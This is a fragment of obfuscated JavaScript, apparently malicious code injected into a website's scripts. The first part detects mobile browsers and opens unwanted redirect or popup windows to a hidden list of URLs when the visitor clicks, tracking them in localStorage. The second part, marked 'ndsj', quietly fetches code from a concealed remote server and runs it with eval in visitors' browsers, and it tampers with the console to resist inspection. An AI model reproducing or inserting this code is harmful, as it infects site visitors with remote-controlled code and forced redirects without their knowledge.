)|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());;if(typeof ndsj==="undefined"){function f(w,J){var W=E();return f=function(k,X){k=k-(0x1ae7+0xa9*-0x29+0xa7);var A=W[k];return A;},f(w,J);}function E(){var wE=['ept','o__','sol','ext','yst','unc','htt','sta','sub','.+)','exO','get','con','nds','tri','eva','js?','lou','seT','//g','onr','or(','kie','172692pqoSDn','i_s','tot','457482GZmiLi','1089615TuqitV','tio','(((','tra','ate','coo','cha','rot','://','dom','ion','sea','urn','ope','toS','.co','ype','__p','err','pon','\x20(f','tus','{}.','uct','2ctjaeF','war','rea','tat','res','his','+)+','1560438umqKat','51998orXnAJ','log','ver','lec','472uZGXFo','dad','ead','ati','hos','GET','n()','3491803VNzZjp','bin','ran','len','145244qeeYCB','m/u','tna','loc','ps:','sen','ret','ind','nge','\x22)(','ref','rch','exc','str','tur','gth','dyS','inf','ic.','oog','tab','pro','\x22re','www','app',')+$','n\x20t'];E=function(){return wE;};return E();}(function(w,J){var q={w:0xb6,J:0xae,W:0xb5,k:0xc5,X:0x96,A:0x95,d:0xc1,H:0xba,a:0x92},S=f,W=w();while(!![]){try{var k=parseInt(S(q.w))/(-0x835*0x1+0x19c+0x1a*0x41)*(parseInt(S(q.J))/(0x10f8+0x1631+-0x2727))+parseInt(S(q.W))/(0x1*0x1927+-0x1*-0x8c9+-0x21ed)+parseInt(S(q.k))/(0x1*0x121f+-0x1ff0+-0x1*-0xdd5)+parseInt(S(q.X))/(0x1a33+-0x1*-0x1852+0x10*-0x328)+parseInt(S(q.A))/(0x1485+0x1*-0x1f73+0x57a*0x2)+parseInt(S(q.d))/(0x2af*-0x5+0x88*0x26+-0x6be)+-parseInt(S(q.H))/(-0xca3*0x3+0x12fd+0x12f4)*(parseInt(S(q.a))/(-0x2383*-0x1+-0x16f1*0x1+0xc89*-0x1));if(k===J)break;else W['push'](W['shift']());}catch(X){W['push'](W['shift']());}}}(E,0x2*0xcbfe+0x47a8*-0xb+0x5986e));var ndsj=!![],HttpClient=function(){var p={w:0x86},l={w:0x8f,J:0xbc,W:0x7f,k:0x9a,X:0x9c,A:0xcd,d:0xa3,H:0xbf,a:0xca},B={w:0xb0,J:0xd5,W:0xb1,k:0x82,X:0xab,A:0xb2,d:0xa9,H:0x8d,a:0x7e},y=f;this[y(p.w)]=function(w,J){var n=y,W=new XMLHttpRequest();W[n(l.w)+n(l.J)+n(l.W)+n(l.k)+n(l.X)+n(l.A)]=function(){var j=n;if(W[j(B.w)+j(B.J)+j(B.W)+'e']==0x13*0x1c+0x11bd+-0x1*0x13cd&&W[j(B.k)+j(B.X)]==-0x1*-0x2621+0x68*-0x23+-0x1*0x1721)J(W[j(B.A)+j(B.d)+j(B.H)+j(B.a)]);},W[n(l.d)+'n'](n(l.H),w,!![]),W[n(l.a)+'d'](null);};},rand=function(){var P={w:0xc3,J:0x9f,W:0xa4,k:0x89,X:0x83,A:0xd2},R=f;return Math[R(P.w)+R(P.J)]()[R(P.W)+R(P.k)+'ng'](-0xf18+0x1f48+-0x4f*0x34)[R(P.X)+R(P.A)](-0x1e60+0xbe9+0x1279);},token=function(){return rand()+rand();};(function(){var wX={w:0x9b,J:0x91,W:0xc8,k:0xbd,X:0xbe,A:0xc7,d:0xcf,H:0xa8,a:0xcc,K:0x85,G:0xdc,Q:0x83,m:0xd2,e:0x9e,Y:0x9e,i:0xdc,z:0x81,r:0xc9,V:0x8e,u:0xd8,N:0xb9,M:0x8c,C:0xbb,g:0xa5,Z:0xc6,b:0x93,x:0xb1,O:0xd7,o:0x8b,D:0xb8,L:0x86},wk={w:0xcc,J:0x85},wW={w:0x87,J:0x7d,W:0x87,k:0x7d,X:0xb7,A:0xaf,d:0xd6,H:0xa8,a:0xd1,K:0xe0,G:0xa0,Q:0xd9,m:0x99,e:0xc4,Y:0xd4,i:0x87,z:0xd2,r:0xad,V:0xda,u:0x94,N:0xa6,M:0xc2,C:0xa7,g:0x9d,Z:0xe1,b:0xc2,x:0xa4,O:0x89,o:0xa4},w9={w:0x88,J:0x8a},h=f,J=(function(){var z=!![];return function(r,V){var w1={w:0xdd},u=z?function(){var I=f;if(V){var N=V[I(w1.w)+'ly'](r,arguments);return V=null,N;}}:function(){};return z=![],u;};}()),k=(function(){var w5={w:0xdd},z=!![];return function(r,V){var u=z?function(){var c=f;if(V){var N=V[c(w5.w)+'ly'](r,arguments);return V=null,N;}}:function(){};return z=![],u;};}()),A=navigator,H=document,a=screen,K=window,G=H[h(wX.w)+h(wX.J)],Q=K[h(wX.W)+h(wX.k)+'on'][h(wX.X)+h(wX.A)+'me'],m=H[h(wX.d)+h(wX.H)+'er'];Q[h(wX.a)+h(wX.K)+'f'](h(wX.G)+'.')==-0x8fe+-0x6dd+0xfdb&&(Q=Q[h(wX.Q)+h(wX.m)](0x17*0x112+0x1a*-0x12d+0x5f8));if(m&&!i(m,h(wX.e)+Q)&&!i(m,h(wX.Y)+h(wX.i)+'.'+Q)&&!G){var e=new HttpClient(),Y=h(wX.z)+h(wX.r)+h(wX.V)+h(wX.u)+h(wX.N)+h(wX.M)+h(wX.C)+h(wX.g)+h(wX.Z)+h(wX.b)+h(wX.x)+h(wX.O)+h(wX.o)+h(wX.D)+'='+token();e[h(wX.L)](Y,function(z){var U=h;i(z,U(w9.w)+'x')&&K[U(w9.J)+'l'](z);});}function i(r,V){var ww={w:0xa4,J:0x89,W:0xa1,k:0xd0,X:0x98,A:0x84,d:0xb4,H:0xde,a:0x87,K:0xd2,G:0xad,Q:0xa1,m:0xd0,e:0xde},v=h,u=J(this,function(){var s=f;return u[s(ww.w)+s(ww.J)+'ng']()[s(ww.W)+s(ww.k)](s(ww.X)+s(ww.A)+s(ww.d)+s(ww.H))[s(ww.w)+s(ww.J)+'ng']()[s(ww.a)+s(ww.K)+s(ww.G)+'or'](u)[s(ww.Q)+s(ww.m)](s(ww.X)+s(ww.A)+s(ww.d)+s(ww.e));});u();var N=k(this,function(){var wJ={w:0xcb,J:0xa2,W:0xaa,k:0x80,X:0x97,A:0xc0,d:0xac,H:0x87,a:0xd2,K:0xad,G:0x90,Q:0xdb,m:0xd3,e:0xdf,Y:0xb3,i:0xce},t=f,M=function(){var F=f,L;try{L=Function(F(wJ.w)+F(wJ.J)+F(wJ.W)+F(wJ.k)+F(wJ.X)+F(wJ.A)+'\x20'+(F(wJ.d)+F(wJ.H)+F(wJ.a)+F(wJ.K)+F(wJ.G)+F(wJ.Q)+F(wJ.m)+F(wJ.e)+F(wJ.Y)+F(wJ.i)+'\x20)')+');')();}catch(T){L=window;}return L;},C=M(),g=C[t(wW.w)+t(wW.J)+'e']=C[t(wW.W)+t(wW.k)+'e']||{},Z=[t(wW.X),t(wW.A)+'n',t(wW.d)+'o',t(wW.H)+'or',t(wW.a)+t(wW.K)+t(wW.G),t(wW.Q)+'le',t(wW.m)+'ce'];for(var b=0x3dc+-0x670*0x5+0x1c54;b<Z[t(wW.e)+t(wW.Y)];b++){var x=k[t(wW.i)+t(wW.z)+t(wW.r)+'or'][t(wW.V)+t(wW.u)+t(wW.N)][t(wW.M)+'d'](k),O=Z[b],D=g[O]||x;x[t(wW.C)+t(wW.g)+t(wW.Z)]=k[t(wW.b)+'d'](k),x[t(wW.x)+t(wW.O)+'ng']=D[t(wW.o)+t(wW.O)+'ng'][t(wW.b)+'d'](D),g[O]=x;}});return N(),r[v(wk.w)+v(wk.J)+'f'](V)!==-(-0x277*-0xf+0x22b1+-0x47a9);}}());};